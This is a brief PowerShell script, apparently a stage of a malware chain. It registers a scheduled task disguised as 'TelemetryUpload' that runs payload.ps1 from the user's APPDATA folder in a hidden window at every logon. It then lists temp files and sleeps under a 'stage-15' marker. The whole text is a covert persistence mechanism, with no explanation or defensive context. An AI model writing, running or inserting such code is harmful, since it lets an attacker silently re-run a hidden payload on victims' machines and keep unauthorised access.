
$TaskName = 'TelemetryUpload'
$ScriptPath = "$env:APPDATA\payload.ps1"
$ErrorActionPreference = "Stop"

$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -WindowStyle Hidden -File `"$env:APPDATA\payload.ps1`""
$TaskTrigger = New-ScheduledTaskTrigger -AtLogOn
$TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName $TaskName -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings -Force
$TaskState = Get-ScheduledTask -TaskName $TaskName
Write-Verbose ("Task state: " + $TaskState.State)

Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
$StageMarker = "stage-15"
Start-Sleep -Seconds 31
Write-Verbose "Stage handoff finished"
